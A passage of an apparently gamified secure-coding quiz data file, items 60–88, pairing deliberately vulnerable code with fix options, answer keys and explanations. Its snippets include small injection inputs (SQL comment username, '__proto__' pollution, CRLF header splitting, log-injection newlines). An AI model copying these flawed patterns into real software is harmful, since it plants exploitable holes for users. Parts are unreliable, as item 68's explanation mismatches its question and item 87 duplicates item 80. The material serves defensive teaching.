        correctOptionId: '60a',
        explanation: 'The effectiveness of a rate limit depends entirely on the identifier used to track requests. This identifier must be reliable and not user-configurable. For authenticated users, their user ID or API key is best. For anonymous users, the source IP address is the most common (though imperfect) identifier.',
    },
    {
        id: '61',
        title: 'Privileged Endpoint Exposure (Admin API)',
        category: 'Broken Access Control',
        difficulty: 'Expert',
        xp: 95,
        description: 'An internal or admin-only API endpoint is accidentally exposed to the public internet without proper firewall rules or authentication.',
        vulnerableCode: `// A microservice for admin tasks is deployed to a public subnet.
// It has no authentication configured, assuming it will only be called by other internal services.
// e.g., http://admin-service.public.cloud/reset-all-passwords`,
        language: 'generic',
        options: [
            {
                id: '61a',
                code: `// Enforce strong authentication on the endpoint, even if it's "internal".`
            },
            {
                id: '61b',
                code: `// Use network-level controls (firewall rules, security groups, VPCs) to ensure the endpoint is only accessible from trusted internal IP ranges.`
            },
            {
                id: '61c',
                code: 'Both A and B are essential. Defense-in-depth requires both strong authentication and strict network controls for privileged endpoints.'
            }
        ],
        correctOptionId: '61c',
        explanation: 'Protecting privileged endpoints requires multiple layers. The network configuration should make it impossible for the public to even connect to the endpoint (B). Additionally, the endpoint itself should still require strong authentication in case the network controls ever fail (A).',
    },
    {
        id: '62',
        title: 'Insecure Cryptographic Practices (Weak Keys)',
        category: 'Crypto',
        difficulty: 'Advanced',
        xp: 85,
        description: 'The application uses a weak or compromised cryptographic algorithm, or uses a strong algorithm incorrectly.',
        vulnerableCode: `// Java
// Using DES, an outdated and insecure encryption standard.
Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");`,
        language: 'java',
        options: [
            {
                id: '62a',
                code: `// Use a modern, strong, and widely-accepted algorithm like AES in a secure mode like GCM.
Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");`
            },
            {
                id: '62b',
                code: `// Use a longer key with DES.`
            },
            {
                id: '62c',
                code: `// Encrypt the data twice with DES for more security.`
            }
        ],
        correctOptionId: '62a',
        explanation: 'Do not roll your own crypto. Use modern, industry-standard algorithms and modes that are recommended by cryptographic experts. For symmetric encryption, AES-256 in GCM mode is a strong, standard choice.',
    },
    {
        id: '63',
        title: 'Password Spraying / Brute Force Resilience',
        category: 'Auth',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'The login endpoint does not have any mechanism to detect or block password spraying attacks (trying a few common passwords against many user accounts).',
        vulnerableCode: `// A standard login endpoint with no account lockout or rate limiting.
app.post('/login', (req, res) => {
  // ... checks username and password
});`,
        language: 'javascript',
        options: [
            {
                id: '63a',
                code: `// Implement account lockout after a certain number of failed login attempts for a single user.`
            },
            {
                id: '63b',
                code: `// Implement IP-based rate limiting on the login endpoint.`
            },
            {
                id: '63c',
                code: `// Both A and B are needed. Account lockout stops brute-force on one account, while IP-based limiting helps slow down spraying across many accounts.`
            }
        ],
        correctOptionId: '63c',
        explanation: 'Defending against various brute-force attacks requires multiple strategies. Account lockout (A) prevents an attacker from targeting a single known account. IP-based rate limiting (B) makes it harder for a single attacker to "spray" a common password against your entire user list.',
    },
    {
        id: '64',
        title: 'Insecure Use of HTTP/2 or Protocol Misconfig',
        category: 'Protocol',
        difficulty: 'Advanced',
        xp: 75,
        description: 'An HTTP/2 server is vulnerable to a DoS attack where a client sends a stream of HEADERS frames without data, consuming server resources.',
        vulnerableCode: `// This is a server configuration vulnerability, not application code.
// E.g., an Nginx server with a low 'http2_max_concurrent_streams' limit but no limit on header processing.`,
        language: 'generic',
        options: [
            {
                id: '64a',
                code: `// Keep the web server software (e.g., Nginx, Apache) and its HTTP/2 module updated to the latest version.`
            },
            {
                id: '64b',
                code: `// Configure server-side limits on the number of concurrent streams, requests per connection, and the size of the header compression table.`
            },
            {
                id: '64c',
                code: 'Both A and B are essential. Keeping the server patched (A) fixes known vulnerabilities, and proper configuration (B) hardens it against protocol-level abuse.'
            }
        ],
        correctOptionId: '64c',
        explanation: 'Protocol-level attacks are complex. The primary defenses are to use up-to-date server software that has patched known vulnerabilities (A) and to apply strict, sensible limits in your server configuration to prevent resource exhaustion (B).',
    },
    {
        id: '65',
        title: 'Insecure Logging (Sensitive Data)',
        category: 'Info Disclosure',
        difficulty: 'Intermediate',
        xp: 55,
        description: 'The application logs sensitive user information, such as passwords or credit card numbers, in plain text.',
        vulnerableCode: `// Python (Flask)
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    # Logging the full request body, including the password.
    app.logger.info(f'Login attempt for user: {username}, data: {request.form}')
    # ... authentication logic ...`,
        language: 'python',
        options: [
            {
                id: '65a',
                code: '// Encrypt the log files.'
            },
            {
                id: '65b',
                code: '// Configure the logging library to filter out sensitive keys like "password", "token", "credit_card", etc., before writing to the log.'
            },
            {
                id: '65c',
                code: '// Log only the username and the result (success/failure).'
            }
        ],
        correctOptionId: '65b',
        explanation: 'Sensitive data should never be written to logs. The best practice is to implement filters at the logging configuration level to automatically scrub or mask known sensitive fields from all log messages.',
    },
    {
        id: '66',
        title: 'JWT Token Sent in URL',
        category: 'Auth',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'An application passes a session JWT (JSON Web Token) as a URL query parameter, making it visible in browser history, server logs, and Referer headers.',
        vulnerableCode: `// Client-side JavaScript
const token = getAuthToken();
// Token is exposed in the URL
window.location.href = \`/dashboard?token=\${token}\`;`,
        language: 'javascript',
        options: [
            {
                id: '66a',
                code: '// Transmit the JWT in a secure, HttpOnly cookie.'
            },
            {
                id: '66b',
                code: '// Transmit the JWT in the `Authorization: Bearer <token>` HTTP header.'
            },
            {
                id: '66c',
                code: 'Both A and B are secure and standard methods. B is common for SPAs, while A is a robust browser-based approach.'
            }
        ],
        correctOptionId: '66c',
        explanation: 'JWTs must never be sent in URL parameters. The two standard, secure methods are to send them in the `Authorization` header for API calls, or to store them in a secure `HttpOnly` cookie.',
    },
    {
        id: '67',
        title: 'SQL Injection (Second Order)',
        category: 'SQL Injection',
        difficulty: 'Expert',
        xp: 95,
        description: 'An attacker stores malicious SQL code in the database (e.g., in their username). The application later uses this "trusted" data in a different query, executing the injection.',
        vulnerableCode: `// Conceptual Flow
// 1. Attacker signs up with username: "admin' --"
// 2. This username is stored safely in the database.
// 3. Later, an admin function uses the username in an unsafe query:
String query = "UPDATE analytics SET last_seen = NOW() WHERE username = '" + username + "'";`,
        language: 'generic',
        options: [
            {
                id: '67a',
                code: `// The fix is the same as for first-order SQLi: use parameterized queries (prepared statements) for all database access, even when using data that is already in your database.`
            },
            {
                id: '67b',
                code: `// Sanitize data before storing it in the database.`
            },
            {
                id: '67c',
                code: `// Use a Web Application Firewall (WAF) to detect malicious usernames.`
            }
        ],
        correctOptionId: '67a',
        explanation: 'Second-order SQL injection highlights the importance of context. Data that seems safe in one context can be dangerous in another. The only reliable defense is to treat all data as untrusted and use parameterized queries for every single database operation.',
    },
    {
        id: '68',
        title: 'Android WebView Insecure Configuration',
        category: 'Mobile Security',
        difficulty: 'Advanced',
        xp: 75,
        description: 'An Android WebView has JavaScript enabled and allows file system access, which can be exploited by malicious JavaScript loaded from a remote source.',
        vulnerableCode: `// Java (Android)
WebView webView = findViewById(R.id.webview);
WebSettings webSettings = webView.getSettings();
// Dangerous combination of settings
webSettings.setJavaScriptEnabled(true);
webSettings.setAllowFileAccess(true);
webView.loadUrl("https://untrusted-site.com");`,
        language: 'java',
        options: [
            {
                id: '68a',
                code: `// Disable JavaScript if it is not absolutely required for the WebView's functionality.
webSettings.setJavaScriptEnabled(false);`
            },
            {
                id: '68b',
                code: `// Explicitly disable file system access unless it is absolutely required.
webSettings.setAllowFileAccess(false);`
            },
            {
                id: '68c',
                code: '// Both A and B are critical. You must follow the principle of least privilege and disable any powerful features that are not strictly necessary for the WebView\'s purpose.'
            }
        ],
        correctOptionId: '68c',
        explanation: 'The principle of least privilege dictates that Android components should not be exported unless necessary (A). If a component must be exported and handle Intents, it must treat them as untrusted input and thoroughly validate them before use (B).',
    },
    {
        id: '69',
        title: 'Cache Poisoning (Web)',
        category: 'Web Cache Poisoning',
        difficulty: 'Advanced',
        xp: 85,
        description: 'An attacker sends a request with an unkeyed header (e.g., `X-Forwarded-Host`) that the application uses to generate the response. A caching proxy then saves this malicious response and serves it to all other users.',
        vulnerableCode: `// Conceptual: A caching proxy (like Varnish or a CDN) is in front of the application.
// Python (Flask)
@app.route('/')
def home():
    # The application uses a header to generate a link, but the cache doesn't know this.
    host = request.headers.get('X-Forwarded-Host', 'example.com')
    return f'<script src="https://{host}/script.js"></script>'`,
        language: 'python',
        options: [
            {
                id: '69a',
                code: `// Configure the cache to include the 'X-Forwarded-Host' header in its cache key.
// This ensures that different header values result in different cache entries.`
            },
            {
                id: '69b',
                code: `// Avoid using headers to dynamically generate the response. Use a relative URL or a server-side configuration value.`
            },
            {
                id: '69c',
                code: 'Both A or B can be a valid fix. B is generally safer as it eliminates the root cause, while A correctly configures the caching behavior.'
            }
        ],
        correctOptionId: '69c',
        explanation: 'Web cache poisoning occurs when an application uses input that is not part of the cache key to generate a response. The ideal fix is to not use such inputs (B). If you must use them, you must configure your cache to vary its cache key based on those inputs (A).',
    },
    {
        id: '70',
        title: 'Insecure Object Reference (Guessable IDs)',
        category: 'IDOR',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'An application uses simple, sequential integer IDs (e.g., `/users/1`, `/users/2`) for objects, making it easy for an attacker to enumerate and guess the IDs of other users\' resources.',
        vulnerableCode: `// The API uses sequential IDs, and an attacker can simply loop through numbers
// to try and access other users' data.
GET /api/documents/101
GET /api/documents/102
GET /api/documents/103`,
        language: 'generic',
        options: [
            {
                id: '70a',
                code: `// Use non-guessable, random identifiers (like UUIDs or CUIDs) for objects instead of sequential integers.
// e.g., GET /api/documents/0b1c7f4e-2b9a-4c8d-8a5f-7e8c9d0b1a2e`
            },
            {
                id: '70b',
                code: `// This is not a vulnerability if proper authorization checks are in place.`
            },
            {
                id: '70c',
                code: 'Both A and B are correct. Proper authorization is the primary defense, but using non-guessable IDs (A) is a critical defense-in-depth measure that prevents enumeration.'
            }
        ],
        correctOptionId: '70c',
        explanation: 'While robust authorization checks are the most important control, using sequential IDs makes it easy for attackers to find valid IDs to attack. Using UUIDs (A) is a best practice that prevents this enumeration, providing an essential layer of defense-in-depth.',
    },
    {
        id: '71',
        title: 'Missing `Secure` Flag on Cookies',
        category: 'Session Management',
        difficulty: 'Intermediate',
        xp: 55,
        description: 'A session cookie is set without the `Secure` flag, allowing it to be transmitted over unencrypted HTTP connections if any part of the site is served over HTTP.',
        vulnerableCode: `// JavaScript (Node.js/Express)
res.cookie('sessionId', 'abc12345', {
  httpOnly: true,
  // Secure flag is missing!
});`,
        language: 'javascript',
        options: [
            {
                id: '71a',
                code: `// Add the 'secure: true' flag to ensure the cookie is only sent over HTTPS.
res.cookie('sessionId', 'abc12345', {
  httpOnly: true,
  secure: true
});`
            },
            {
                id: '71b',
                code: `// Enforce HTTPS across the entire site using HSTS.`
            },
            {
                id: '71c',
                code: 'Both A and B are important. The `secure` flag is a direct fix, and HSTS is a broader policy that ensures the browser only communicates over HTTPS.'
            }
        ],
        correctOptionId: '71c',
        explanation: 'The `Secure` flag on a cookie is essential to prevent it from being accidentally transmitted over an insecure connection. This should be combined with an HSTS (HTTP Strict Transport Security) policy, which tells the browser to never even attempt to connect via HTTP.',
    },
    {
        id: '72',
        title: 'HTTP Parameter Pollution (HPP)',
        category: 'Web Cache Poisoning',
        difficulty: 'Advanced',
        xp: 70,
        description: 'An attacker sends multiple HTTP parameters with the same name, and the application\'s backend interprets them differently than an intermediary system (like a cache or WAF), leading to a bypass.',
        vulnerableCode: `// Python (Flask)
// Attacker sends: ?id=123&id=456
// Some frameworks might see 'id' as '456', while others might see it as '123' or ['123', '456'].
@app.route('/data')
def get_data():
    user_id = request.args.get('id') // Only gets the first one in Flask
    # ... logic based on user_id ...`,
        language: 'python',
        options: [
            {
                id: '72a',
                code: `// Be aware of how your specific web framework handles duplicate parameter names.
// Explicitly get all values and decide how to handle them.
user_ids = request.args.getlist('id')
if len(user_ids) > 1:
    abort(400, "Duplicate parameter found")
user_id = user_ids[0]`
            },
            {
                id: '72b',
                code: `// Use a Web Application Firewall (WAF) to block requests with duplicate parameters.`
            },
            {
                id: '72c',
                code: `// Always use the last parameter value provided.`
            }
        ],
        correctOptionId: '72a',
        explanation: 'HPP vulnerabilities arise from inconsistent parsing of HTTP parameters. The application code must be explicit about how it handles duplicate parameters, rather than relying on the framework\'s default behavior which may differ from other systems in the request chain.',
    },
    {
        id: '73',
        title: 'Information Leakage in Debugging Endpoints',
        category: 'Info Disclosure',
        difficulty: 'Intermediate',
        xp: 55,
        description: 'A debugging endpoint, such as `/status` or `/debug`, is left enabled in production and exposes sensitive internal state information.',
        vulnerableCode: `// Java (Spring Boot Actuator)
// The '/actuator/env' endpoint is enabled by default in some configurations,
// which can leak environment variables, system properties, and configuration values.`,
        language: 'java',
        options: [
            {
                id: '73a',
                code: `// Explicitly disable or secure all debugging and actuator endpoints in production.
// application.properties:
management.endpoints.web.exposure.include=health,info`
            },
            {
                id: '73b',
                code: `// Change the default path of the actuator endpoints from '/actuator' to a secret path.`
            },
            {
                id: '73c',
                code: `// Put a comment in the code warning developers not to use it.`
            }
        ],
        correctOptionId: '73a',
        explanation: 'Debugging endpoints are a common source of information leakage. They must be completely disabled in production environments or, if needed, secured with strong authentication and authorization.',
    },
    {
        id: '74',
        title: 'Improper Certificate Validation',
        category: 'Crypto',
        difficulty: 'Advanced',
        xp: 85,
        description: 'An HTTP client is configured to ignore TLS/SSL certificate validation errors, making it vulnerable to man-in-the-middle (MITM) attacks.',
        vulnerableCode: `// Python
import requests

// This disables certificate validation, which is very dangerous!
response = requests.get('https://example.com', verify=False)`,
        language: 'python',
        options: [
            {
                id: '74a',
                code: `// Never disable certificate validation in production.
// Always use 'verify=True' (which is the default).
response = requests.get('https://example.com')`
            },
            {
                id: '74b',
                code: `// If connecting to an internal service with a self-signed certificate, provide the path to a trusted CA bundle.
response = requests.get('https://internal.service', verify='/path/to/ca.crt')`
            },
            {
                id: '74c',
                code: 'Both A and B are correct. A is for public sites, while B is the correct way to handle internal CAs without globally disabling security.'
            }
        ],
        correctOptionId: '74c',
        explanation: 'TLS certificate validation is a cornerstone of web security. Disabling it completely opens the door to MITM attacks. For public sites, validation should always be enabled. For internal sites with custom certificates, the correct approach is to configure the client to trust the specific Certificate Authority (CA) used.',
    },
    {
        id: '75',
        title: 'Race Condition in Financial Transaction',
        category: 'Business Logic',
        difficulty: 'Expert',
        xp: 95,
        description: 'Two simultaneous requests to withdraw money can succeed if the balance check and debit operation are not atomic, allowing a user to withdraw more money than they have.',
        vulnerableCode: `// Conceptual API Logic
async function withdraw(userId, amount) {
  const user = await db.getUser(userId);
  // 1. Check balance
  if (user.balance >= amount) {
    // 2. Attacker sends another request here!
    // 3. Debit account
    await db.updateBalance(userId, user.balance - amount);
    return "Success";
  }
}`,
        language: 'generic',
        options: [
            {
                id: '75a',
                code: `// Use a database transaction with a locking mechanism (e.g., 'SELECT ... FOR UPDATE') to ensure the check-and-debit operation is atomic.
// BEGIN TRANSACTION;
// SELECT balance FROM users WHERE id = ? FOR UPDATE;
// -- if balance is sufficient --
// UPDATE users SET balance = balance - ? WHERE id = ?;
// COMMIT;`
            },
            {
                id: '75b',
                code: `// Add a small delay between checking the balance and updating it.`
            },
            {
                id: '75c',
                code: `// Use a 'volatile' keyword on the balance variable.`
            }
        ],
        correctOptionId: '75a',
        explanation: 'This "Time-of-check to time-of-use" (TOCTOU) vulnerability must be solved by making the operation atomic. A database transaction with row-level locking ensures that once a balance is read for an update, no other transaction can read or write to it until the first one is complete.',
    },
    {
        id: '76',
        title: 'Insecure Password Reset Mechanism',
        category: 'Auth',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'The password reset functionality leaks information about whether a username or email exists in the system.',
        vulnerableCode: `// API Logic
app.post('/forgot-password', (req, res) => {
  const user = db.findByEmail(req.body.email);
  if (user) {
    // Logic to send reset email...
    res.send("If an account with that email exists, we have sent a reset link.");
  } else {
    // This different response leaks information!
    res.status(404).send("No account found with that email address.");
  }
});`,
        language: 'javascript',
        options: [
            {
                id: '76a',
                code: `// Return the same generic error message for both cases.
// This prevents an attacker from enumerating valid emails/usernames.
app.post('/forgot-password', (req, res) => {
  const user = db.findByEmail(req.body.email);
  if (user) {
    // Logic to send reset email...
  }
  // Send the same response in all cases!
  res.send("If an account with that email exists, we have sent a reset link.");
});`
            },
            {
                id: '76b',
                code: `// Rate-limit the forgot password endpoint.`
            },
            {
                id: '76c',
                code: `// Use a CAPTCHA on the forgot password form.`
            }
        ],
        correctOptionId: '76a',
        explanation: 'Account registration and password reset endpoints should not reveal whether an email or username is already registered. To prevent user enumeration, the application should return a consistent, generic response in both success and failure cases.',
    },
    {
        id: '77',
        title: 'Missing `SameSite` Cookie Attribute',
        category: 'Session Management',
        difficulty: 'Intermediate',
        xp: 55,
        description: 'A session cookie is set without the `SameSite` attribute, making it vulnerable to being sent in cross-site requests, which is a key component of CSRF attacks.',
        vulnerableCode: `// JavaScript (Node.js/Express)
res.cookie('sessionId', 'abc12345', {
  httpOnly: true,
  secure: true,
  // SameSite attribute is missing!
});`,
        language: 'javascript',
        options: [
            {
                id: '77a',
                code: `// Set the SameSite attribute to 'Lax' or 'Strict'.
// 'Lax' is a good default for most applications.
res.cookie('sessionId', 'abc12345', {
  httpOnly: true,
  secure: true,
  sameSite: 'Lax'
});`
            },
            {
                id: '77b',
                code: `// Rely on the user's browser to have a default SameSite policy.`
            },
            {
                id: '77c',
                code: `// Use an anti-CSRF token instead of the SameSite attribute.`
            }
        ],
        correctOptionId: '77a',
        explanation: 'The `SameSite` cookie attribute is a powerful defense against CSRF attacks. Setting it to `Lax` prevents the cookie from being sent on most cross-site requests (e.g., from a form on another domain). `Strict` is even more secure but can affect user experience with top-level navigation.',
    },
    {
        id: '78',
        title: 'Prototype Pollution (Deep Merge)',
        category: 'RCE',
        difficulty: 'Expert',
        xp: 95,
        description: 'A recursive merge function can be exploited to add properties to `Object.prototype` by crafting a malicious JSON payload.',
        vulnerableCode: `// JavaScript
function merge(target, source) {
  for (let key in source) {
    if (key in source && key in target) {
      merge(target[key], source[key]); // Recursive call
    } else {
      target[key] = source[key];
    }
  }
}
// Attacker sends: JSON.parse('{"__proto__":{"polluted":true}}')`,
        language: 'javascript',
        options: [
            {
                id: '78a',
                code: `// Proactively freeze the Object prototype.
Object.freeze(Object.prototype);`
            },
            {
                id: '78b',
                code: `// Explicitly block the '__proto__' key during the merge.
function merge(target, source) {
  for (let key in source) {
    if (key === '__proto__') continue;
    // ...
  }
}`
            },
            {
                id: '78c',
                code: `// Use objects without a prototype for merging.
let obj1 = Object.create(null);`
            }
        ],
        correctOptionId: '78a',
        explanation: 'While blocking specific keys helps, attackers often find bypasses (e.g., using `constructor.prototype`). The most definitive defense is to freeze `Object.prototype` at the start of your application, which prevents any modification to it. Using `Object.create(null)` is also a very effective pattern.',
    },
    {
        id: '79',
        title: 'Android Intent Redirection',
        category: 'Mobile Security',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An exported Android component accepts an Intent as a parameter and then uses it to start another component, allowing a malicious app to launch internal, protected components.',
        vulnerableCode: `// Java (Android)
// A public, exported Activity
public class RedirectActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = getIntent().getParcelableExtra("redirect_intent");
        // The app starts whatever component the malicious app provided.
        startActivity(intent);
    }
}`,
        language: 'java',
        options: [
            {
                id: '79a',
                code: `// Set 'android:exported="false"' on the RedirectActivity in the AndroidManifest.xml if it does not need to be launched by other apps.`
            },
            {
                id: '79b',
                code: `// Validate the Intent before using it. Check the target component, action, and data to ensure it is a safe and expected Intent.`
            },
            {
                id: '79c',
                code: 'Both A and B are critical defenses. Make components private by default (A), and always validate any data or Intents received from other apps (B).'
            }
        ],
        correctOptionId: '79c',
        explanation: 'The principle of least privilege dictates that Android components should not be exported unless necessary (A). If a component must be exported and handle Intents, it must treat them as untrusted input and thoroughly validate them before use (B).',
    },
    {
        id: '80',
        title: 'JWT Secret Key Brute-Force',
        category: 'Auth',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'An HMAC-signed JWT uses a weak, easily guessable secret key, allowing an attacker to brute-force the key and then forge valid tokens for any user.',
        vulnerableCode: `// JavaScript (jsonwebtoken library)
// The secret key is a common, simple word.
const secret = "secret";
const token = jwt.sign({ user: 'admin' }, secret);`,
        language: 'javascript',
        options: [
            {
                id: '80a',
                code: `// Use a very long, high-entropy, randomly generated string as the secret key.
// const secret = require('crypto').randomBytes(64).toString('hex');`
            },
            {
                id: '80b',
                code: `// Use an asymmetric algorithm (RS256) with a public/private key pair instead of a shared secret.`
            },
            {
                id: '80c',
                code: 'Both A and B are valid solutions. A secures the HMAC approach, while B is an alternative cryptographic approach that avoids shared secrets.'
            }
        ],
        correctOptionId: '80c',
        explanation: 'The security of HMAC-signed tokens depends entirely on the secrecy and strength of the secret key. It must be long and random (A). Using asymmetric cryptography like RS256 (B) is an even better practice, as it avoids the need to share a secret between the signing and verifying parties.',
    },
    {
        id: '81',
        title: 'Denial of Service (DoS) via File Uploads',
        category: 'DoS / Abuse',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'An application allows users to upload files without any size restrictions, enabling an attacker to fill up the server\'s disk space by uploading very large files.',
        vulnerableCode: `// JavaScript (Node.js with multer)
// No file size limits are configured for the upload.
app.post('/upload', upload.single('file'), (req, res) => {
  res.send('File uploaded!');
});`,
        language: 'javascript',
        options: [
            {
                id: '81a',
                code: `// Configure a reasonable file size limit in the file upload middleware.
const upload = multer({
  dest: 'uploads/',
  limits: { fileSize: 5 * 1024 * 1024 } // 5 MB limit
});`
            },
            {
                id: '81b',
                code: '// Configure the web server (e.g., Nginx) to limit the maximum request body size.'
            },
            {
                id: '81c',
                code: 'Both A and B provide important layers of defense against large file upload DoS attacks.'
            }
        ],
        correctOptionId: '81c',
        explanation: 'Protecting against resource exhaustion from file uploads requires limits at multiple levels. The application itself should have a configured limit (A), and the web server in front of the application should also enforce a maximum request body size (B) as an earlier line of defense.',
    },
    {
        id: '82',
        title: 'Insecure Use of `dangerouslySetInnerHTML`',
        category: 'XSS',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'React\'s `dangerouslySetInnerHTML` prop is used to render user-provided HTML without sanitizing it first, creating a classic Stored XSS vulnerability.',
        vulnerableCode: `// React Component
function UserComment({ comment }) {
  // 'comment.htmlContent' comes from a user and is not sanitized.
  return <div dangerouslySetInnerHTML={{ __html: comment.htmlContent }} />;
}`,
        language: 'javascript',
        options: [
            {
                id: '82a',
                code: `// Use a trusted, well-maintained HTML sanitization library (like DOMPurify) before passing content to dangerouslySetInnerHTML.
import DOMPurify from 'dompurify';
function UserComment({ comment }) {
  const sanitizedHtml = DOMPurify.sanitize(comment.htmlContent);
  return <div dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />;
}`
            },
            {
                id: '82b',
                code: `// Avoid 'dangerouslySetInnerHTML' completely and render the content as text.
function UserComment({ comment }) {
  return <div>{comment.htmlContent}</div>;
}`
            },
            {
                id: '82c',
                code: 'Both are valid. A is the fix if you must render user-supplied HTML. B is the simplest and safest fix if you do not need to render HTML.'
            }
        ],
        correctOptionId: '82c',
        explanation: 'As its name implies, `dangerouslySetInnerHTML` is dangerous. You should avoid it whenever possible (B). If you absolutely must render HTML from an untrusted source, you must sanitize it with a robust library like DOMPurify first (A).',
    },
    {
        id: '83',
        title: 'NoSQL Injection',
        category: 'SQL Injection',
        difficulty: 'Advanced',
        xp: 85,
        description: 'User input is used to construct a NoSQL database query (e.g., for MongoDB), allowing an attacker to manipulate the query logic.',
        vulnerableCode: `// JavaScript (Node.js with MongoDB)
// Attacker sends a JSON request body like: { "$gt": "" }
app.get('/users', (req, res) => {
  // User input is directly placed inside the query object.
  db.collection('users').find({ username: req.query.username }).toArray(...);
});`,
        language: 'javascript',
        options: [
            {
                id: '83a',
                code: `// Never construct queries by mixing user input with operators.
// Always treat user input as literal values.
db.collection('users').find({ username: String(req.query.username) }).toArray(...);`
            },
            {
                id: '83b',
                code: '// Sanitize user input to remove characters like `$` and `{`.\nconst sanitized = req.query.username.replace(/\\$/g, \'\');'
            },
            {
                id: '83c',
                code: '// Use a library that automatically prevents NoSQL injection.'
            }
        ],
        correctOptionId: '83a',
        explanation: 'NoSQL injection occurs when user input is interpreted as query operators instead of literal values. The solution is to ensure user input is always treated as data. This can involve casting it to the expected type (e.g., `String()`) and never allowing user input to define the structure (the keys or operators) of the query object.',
    },
    {
        id: '84',
        title: 'Log Injection',
        category: 'Info Disclosure',
        difficulty: 'Intermediate',
        xp: 55,
        description: 'User input is logged without being sanitized, allowing an attacker to inject fake log entries, including newlines, to confuse log monitoring systems.',
        vulnerableCode: `// Java
String username = request.getParameter("username");
// Attacker provides username: "guest%0AINFO:+User+admin+logged+in+successfully"
log.info("Login failed for user: " + username);`,
        language: 'java',
        options: [
            {
                id: '84a',
                code: `// Sanitize log data by removing or encoding newline characters and other control characters before logging.
String username = request.getParameter("username").replaceAll("\\\\r|\\\\n", "");
log.info("Login failed for user: " + username);`
            },
            {
                id: '84b',
                code: '// Use a logging framework that automatically handles encoding.'
            },
            {
                id: '84c',
                code: 'Both A and B are valid solutions. Modern logging frameworks (B) are the preferred approach as they handle this safely by default.'
            }
        ],
        correctOptionId: '84c',
        explanation: 'To prevent log injection, all user-controllable data must be sanitized before being written to logs. This typically involves filtering out newline characters. Using a modern logging framework that does this automatically is the most reliable solution.',
    },
    {
        id: '85',
        title: 'HTTP Response Splitting',
        category: 'Web Cache Poisoning',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An attacker can inject CRLF characters into a response header, causing the server to split the response into two. This can be used to control the second response, leading to XSS or cache poisoning.',
        vulnerableCode: `// PHP
// Attacker sets ?lang=en%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK...
$lang = $_GET['lang'];
header("Content-Language: " . $lang);`,
        language: 'php',
        options: [
            {
                id: '85a',
                code: `// Filter user input to remove newline characters ('\\r', '\\n') before placing it in a response header.
$lang = str_replace(array("\\r", "\\n"), '', $_GET['lang']);
header("Content-Language: " . $lang);`
            },
            {
                id: '85b',
                code: '// Modern language versions and frameworks often have built-in protections against HTTP header injection. Keeping software updated is critical.'
            },
            {
                id: '85c',
                code: 'Both A and B are important. The application should perform its own filtering (A), and it should run on an up-to-date platform that has inherent protections (B).'
            }
        ],
        correctOptionId: '85c',
        explanation: 'HTTP Response Splitting is a critical vulnerability that is prevented by strictly filtering any user input that is reflected in a response header. Newline characters are the primary vector and must be removed. Using up-to-date frameworks provides an essential second layer of defense.',
    },
    {
        id: '86',
        title: 'Android Hardcoded API Key',
        category: 'Mobile Security',
        difficulty: 'Intermediate',
        xp: 55,
        description: 'An API key is hardcoded into an Android application\'s source code. An attacker can decompile the app to extract the key.',
        vulnerableCode: `// Java (Android)
public class ApiClient {
    private static final String API_KEY = "super-secret-api-key";
    // ...
}`,
        language: 'java',
        options: [
            {
                id: '86a',
                code: `// Do not store keys in code. Store them in 'build.gradle' and reference them from 'BuildConfig'.
// build.gradle: buildConfigField("String", "API_KEY", "\\"YOUR_API_KEY\\"")
// Code: String key = BuildConfig.API_KEY;`
            },
            {
                id: '86b',
                code: `// Use the NDK to store the key in C++ code, which is harder to decompile.`
            },
            {
                id: '86c',
                code: 'Both A and B provide some level of obfuscation, but neither is completely secure. The only truly secure approach is to not store secrets on the client at all.'
            }
        ],
        correctOptionId: '86c',
        explanation: 'Any key stored on the client (mobile app) can eventually be found by a determined attacker. While methods like using the NDK or Gradle files make it harder, they are not foolproof. The most secure architecture involves a backend server that holds the secret key and proxies requests for the mobile client.',
    },
    {
        id: '87',
        title: 'JWT Secret Key Brute-Force',
        category: 'Auth',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'An HMAC-signed JWT uses a weak, easily guessable secret key, allowing an attacker to brute-force the key and then forge valid tokens for any user.',
        vulnerableCode: `// JavaScript (jsonwebtoken library)
// The secret key is a common, simple word.
const secret = "secret";
const token = jwt.sign({ user: 'admin' }, secret);`,
        language: 'javascript',
        options: [
            {
                id: '87a',
                code: `// Use a very long, high-entropy, randomly generated string as the secret key.
// const secret = require('crypto').randomBytes(64).toString('hex');`
            },
            {
                id: '87b',
                code: `// Use an asymmetric algorithm (RS256) with a public/private key pair instead of a shared secret.`
            },
            {
                id: '87c',
                code: 'Both A and B are valid solutions. A secures the HMAC approach, while B is an alternative cryptographic approach that avoids shared secrets.'
            }
        ],
        correctOptionId: '87c',
        explanation: 'The security of HMAC-signed tokens depends entirely on the secrecy and strength of the secret key. It must be long and random (A). Using asymmetric cryptography like RS256 (B) is an even better practice, as it avoids the need to share a secret between the signing and verifying parties.',
    },
    {
        id: '88',
        title: 'Server-Side Template Injection (SSTI)',
        category: 'RCE',
        difficulty: 'Advanced',
        xp: 85,
        description: 'User input is concatenated directly into a server-side template, allowing the user to inject template directives that can lead to information disclosure or RCE.',
        vulnerableCode: `// Python (Jinja2 Template)
// User provides input like: {{ 7 * 7 }}
from jinja2 import Template
user_input = request.args.get('name')
template = Template("Hello, " + user_input)
return template.render()`,
        language: 'python',
        options: [
            {
                id: '88a',
                code: `// Never concatenate user input into templates. Always pass user data into the template through the render context.
template = Template("Hello, {{ name }}")
return template.render(name=user_input)`
            },
            {
                id: '88b',
                code: `// Sanitize the user input to remove curly braces '{{'.`
            },
            {
                id: '88c',
                code: `// Use a sandboxed template engine.`
            }
        ],
        correctOptionId: '88a',
        explanation: 'SSTI is prevented by strictly separating the template code from the data. User input should never be part of the template string itself; it should always be passed as a variable to the `render` function, where it will be safely handled as data.',
